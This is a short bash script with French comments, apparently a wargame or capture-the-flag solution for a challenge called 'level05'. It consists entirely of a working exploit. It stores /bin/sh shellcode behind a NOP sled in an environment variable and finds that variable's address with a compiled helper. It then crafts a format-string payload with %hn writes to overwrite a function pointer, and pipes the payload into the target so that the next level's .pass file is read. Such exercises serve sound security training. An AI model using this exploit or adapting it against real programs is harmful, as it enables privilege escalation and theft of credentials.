#! /bin/bash

##creation de notre variable avec le shellcode
export EGG=`python -c 'print "\x90" * 128 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'`

##creation du programme qui va trouver l'adresse de la variable
echo '''
#include <stdio.h>
#include <stdlib.h>
int main ()
{
  printf("%p\\n", getenv("EGG"));
  return 0;
}
''' > /tmp/addr.c;

gcc -m32 /tmp/addr.c -o /tmp/addr;

#script python qui va générer l'exploit à envoyer dans le programme
/tmp/addr | python -c '''
import struct
exit_1 = struct.pack("I", 0x080497e0)
exit_2 = struct.pack("I", 0x080497e0 + 2)
addr_shell = int(raw_input(''), 16)
pad = [0xffff & addr_shell, (0xffff0000 & addr_shell) >> 16]
a1 = min(pad)
a2 = max(pad)
exp = exit_1 + exit_2
p = lambda x: "%%%sx" % x
ret = exp + p(a1 - len(exp)) + "%10$hn" + p(a2 - a1) + "%11$hn"
print ret
''' > /tmp/exploit_level05;

(cat /tmp/exploit_level05; echo "cat /home/users/level06/.pass";) | ./level05;